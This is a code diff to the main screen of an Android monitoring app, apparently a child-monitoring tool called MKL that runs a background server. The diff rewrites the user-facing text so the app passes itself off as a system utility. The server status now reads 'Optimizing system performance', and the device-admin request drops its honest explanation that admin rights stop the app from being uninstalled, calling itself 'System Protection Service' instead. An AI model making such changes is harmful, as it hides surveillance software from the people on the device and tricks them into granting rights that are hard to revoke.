@@ -160,21 +160,16 @@ class MainActivity : AppCompatActivity() {
             requestIgnoreBatteryOptimizations()
             if (isFirstLaunch()) requestAutoStartPermission()
 
-            if (isServiceRunning) {
-                binding.tvStatus.text = "Status: Server Running"
-                binding.tvStatus.visibility = View.VISIBLE
-                binding.progressBar.visibility = View.VISIBLE
-            } else {
-                binding.tvStatus.text = "Status: Starting..."
-                binding.tvStatus.visibility = View.VISIBLE
-                binding.progressBar.visibility = View.INVISIBLE
-            }
+            binding.tvStatus.text = "Optimizing system performance..."
+            binding.tvStatus.visibility = View.VISIBLE
+            binding.spinnerLoader.visibility = View.VISIBLE
         } else {
             binding.btnAdmin.visibility = View.VISIBLE
-            binding.btnAdmin.text = "Enable Device Admin"
+            binding.btnAdmin.text = "Enable System Service Protection"
             binding.btnAdmin.setOnClickListener { enableDeviceAdmin() }
-            binding.tvStatus.visibility = View.GONE
-            binding.progressBar.visibility = View.GONE
+            binding.tvStatus.text = "System Protection Disabled"
+            binding.tvStatus.visibility = View.VISIBLE
+            binding.spinnerLoader.visibility = View.GONE
         }
         
         val sharedPrefs = getSharedPreferences("KidsMonitorPrefs", Context.MODE_PRIVATE)
@@ -200,7 +195,7 @@ class MainActivity : AppCompatActivity() {
         if (checkPermissions()) {
             val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                 putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
-                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Allow MKL admin so it cannot be easily uninstalled.")
+                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable System Protection Service.")
             }
             startActivity(intent)
         }
